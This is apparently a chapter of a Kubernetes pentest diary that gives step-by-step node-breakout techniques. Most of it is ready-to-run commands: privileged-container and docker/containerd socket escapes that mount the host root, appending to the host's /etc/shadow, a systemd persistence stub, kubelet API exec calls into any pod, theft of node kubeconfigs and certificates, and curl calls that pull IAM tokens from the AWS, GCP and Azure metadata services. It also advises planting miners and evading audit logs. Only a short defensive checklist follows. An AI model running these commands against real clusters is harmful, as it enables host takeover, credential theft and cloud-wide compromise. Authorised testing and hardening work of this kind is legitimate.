# 📄 **15_node_escapes.md**

### *Phase 6 — Node Breakout, Host Access & Cluster Domination*

**Mi Familia Edition — Kubernetes / k3s Pentest Diary**

---

````markdown
# 15 — Node Escapes & Host Breakout
### Phase 6: From Container → Host → Cluster Control Plane  
Node compromise is the highest-impact stage in Kubernetes pentesting.  
Once you break out of a pod and gain access to the underlying node, **the entire cluster is at risk**, because:

- Nodes hold workload credentials  
- Nodes run container runtime sockets  
- Nodes mount secrets  
- Nodes run kubelet (attackable)  
- Nodes can impersonate pods  
- Nodes can reach internal control-plane endpoints (even private ones)  
- Nodes can deploy & mutate workloads without kubectl  

This stage is where Kubernetes breaches become **cluster-wide compromises**.

---

# 🧨 1. High-Risk Indicators for Node Breakout

You are likely able to break out of a node if any of the following is true:

### Privileged containers:
```json
"securityContext": {
  "privileged": true
}
````

### hostPath mounts:

```yaml
volumes:
- hostPath:
    path: /
```

### Docker/containerd socket mounted:

```
/var/run/docker.sock  
/run/containerd/containerd.sock
```

### CAP_SYS_ADMIN or CAP_SYS_PTRACE:

```
capabilities:
  add:
    - SYS_ADMIN
    - SYS_PTRACE
```

### hostNetwork or hostPID enabled.

### /sys, /proc, /dev fully exposed.

If ANY pod shows these:
🚨 **You have a near-certain path to node compromise.**

---

# 🧱 2. Escape via Privileged Container (Classic Breakout)

Once inside a privileged container:

```bash
nsenter --mount=/proc/1/ns/mnt -- /bin/sh
```

If successful, you're **now on the host filesystem**.

Alternate escape:

```bash
chroot /host
```

If `/` is mounted from host → instant breakout.

---

# 📦 3. Escape via hostPath Mounts

### Check if hostPath exists:

```bash
grep hostPath pod.yaml
```

Common exploitable mounts:

* `/`
* `/etc`
* `/var/run`
* `/var/lib/kubelet`
* `/proc`
* `/dev`
* `/root`
* `/run/containerd`

### Pivot example — modify host’s /etc/shadow:

```bash
echo 'root:$1$xyz$...' >> /host/etc/shadow
```

### Hidden persistence:

```bash
mkdir /host/etc/systemd/system/pwn.service
```

---

# 🧲 4. Escape via Docker Socket (`docker.sock`)

If `/var/run/docker.sock` is mounted:

```bash
docker ps
docker run -it --privileged --net=host -v /:/host alpine chroot /host sh
```

This is effectively **instant root on the node**.

---

# 🔧 5. Escape via containerd Socket

containerd exploitation is less widely documented but **equally dangerous**.

### List pods via containerd:

```bash
ctr -n k8s.io containers list
```

### Start host-mounted container:

```bash
ctr -n k8s.io run \
  --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/alpine:latest \
  escape \
  chroot /host sh
```

This is the current dominant real-world breakout path in modern clusters.

---

# 📁 6. Escape via Kubelet Directory Access

If the pod has access to:

```
/var/lib/kubelet/pki
/var/lib/kubelet/
```

Attack chain:

### 6.1 Read kubelet client certificates

These may allow direct TLS access to API server.

### 6.2 Abuse container logs to leak secrets

Kubelet stores container log files with plain stdout.

### 6.3 Steal token from projected serviceaccount.io

Nodes cache SA tokens & volume mounts.

---

# 🧬 7. Escape via cgroups (Less Common But Powerful)

If you have CAP_SYS_ADMIN and cgroup v1:

BoF-style escape:

```bash
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/memory.force_empty
```

Or use:

```bash
unshare -m /bin/sh
mount -o bind / /mnt
```

This puts you **outside container mount namespace**.

---

# 🛠️ 8. Escape via Kernel Exploits (Real Clusters Often Vulnerable)

Container kernels are shared with host.

If kernel version is old:

```bash
uname -a
```

Attempt exploitation:

* Dirty COW (CVE-2016-5195)
* Dirty Pipe (CVE-2022-0847)
* OverlayFS escapes (multiple CVEs)
* runc breakout vulnerabilities

Kernel exploits often bypass all container boundaries.

---

# 📡 9. Post-Escape Enumeration (Host Level)

Once you're on the node, gather intel:

### Processes:

```bash
ps aux
```

### Kubelet info:

```bash
ps aux | grep kubelet
```

### Container runtime info:

```bash
systemctl status containerd docker
```

### Cloud identity credentials:

```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Node kubeconfig:

```bash
cat /var/lib/kubelet/kubeconfig
```

### kubelet client certs:

```bash
ls -la /var/lib/kubelet/pki
```

Node-level breach → access to:

* kubelet API
* node credential bootstrap
* internal control-plane endpoints

This often becomes **cluster-admin**.

---

# 🔱 10. Attack the Kubelet API (Very Real-World)

Kubelet API default port:

```
10250
```

Check access:

```bash
curl -k https://localhost:10250/pods
```

If unauthorized access enabled →
Total cluster compromise.

### Exec into ANY pod from node:

```bash
curl -XPOST -k \
  "https://localhost:10250/exec/<namespace>/<pod>/<container>?command=/bin/sh&stdin=true&stdout=true"
```

### Read ANY pod logs:

```bash
curl -k https://localhost:10250/logs/<namespace>/<pod>/<container>
```

---

# 🚀 11. Attack the Container Runtime Directory Structure

On the host:

### containerd:

```
/run/containerd/
/var/lib/containerd/io.containerd.runtime.v2.task/k8s.io/
```

### docker:

```
/var/lib/docker/containers
```

These contain:

* container rootfs
* environment variables
* logs
* secrets
* filesystem overlays

You can **read and modify running containers**.

---

# 💥 12. Modify Pods at Rest (Host-Level Rootfs Mutation)

All Kubernetes pods use overlayfs.
At node-level you can mutate any pod like this:

```
/var/lib/containerd/.../<pod-id>/rootfs/
```

Meaning you can:

* Add SSH keys
* Replace binaries
* Inject crypto miners
* Pivot silently

This method bypasses **kubectl audit logs**.

---

# 🛰️ 13. Cluster Admin via Node Bootstrap Token Theft

Nodes authenticate to API server using bootstrap credentials.

Look for:

```
/var/lib/kubelet/bootstrap-kubeconfig
/var/lib/kubelet/kubeconfig
```

If a node has `"system:nodes"` privileges, you may impersonate it:

```bash
curl -k --cert node.crt --key node.key \
  https://<apiserver>/api/v1/nodes
```

This is effectively **cluster-admin**.

---

# 🌩️ 14. Cloud Provider Escalation After Node Breakout

Nodes often have IAM roles attached.

### AWS (EKS):

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### GCP (GKE):

```bash
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure (AKS):

```bash
curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token"
```

Cloud creds →
Cluster API access →
Secret store access →
Full cloud compromise.

---

# 🧠 15. Node Escape Decision Tree (Professional Version)

```mermaid
flowchart TD
  A["Pod Access"] --> B{"Privileged?"}
  B -->|Yes| C["nsenter → Host"]
  B -->|No| D{"hostPath Mounts?"}

  D -->|Yes| E["Chroot /host → Host"]
  D -->|No| F{"Runtime Socket Mounted?"}

  F -->|docker.sock| G["Docker → Run Privileged → Host"]
  F -->|containerd.sock| H["ctr run --privileged → Host"]

  F -->|No| I{"CAP_SYS_ADMIN?"}
  I -->|Yes| J["Namespace Escape → Host"]

  J --> K["Host Recon & Kubelet Abuse"]
  C --> K
  E --> K
  G --> K
  H --> K

  K --> L{"Cloud Metadata?"}
  L -->|Yes| M["Cloud IAM Pivot → Control Plane"]
  L -->|No| N["Kubelet Certificates → Cluster Admin"]

  M --> O["Cluster-Wide Control"]
  N --> O
```



---

# 🛡️ 16. Defensive Notes (Blue Team Reality Check)

Node escapes happen most often because:

* Privileged pods exist in production
* Operators require hostPath
* CI/CD workloads run as root
* containerd.sock is exposed
* Cluster uses old Linux kernels
* Kubelet anonymous auth still enabled
* No PodSecurity admission
* Falco/OPA/Gatekeeper not deployed
* No runtime isolation (AppArmor/SELinux disabled)

Defenders should treat any **node breakout** as:

* SEV-1
* assume full cluster compromise
* rotate SA tokens, secrets, node certificates immediately

---

# 🎯 17. Summary — Node Compromise = Cluster Compromise

Breaking out of a node allows:

* Full access to all workloads
* Full access to service accounts
* Read/modify deployed containers
* Access to container runtime
* Access to kubelet
* Access to cluster metadata
* Privilege escalation to control plane
* Cloud provider escalation

This stage represents **total control of the environment**.

Proceed to:
➡️ **16_post_exploitation.md** (Persistence, dominance, exfiltration)

```

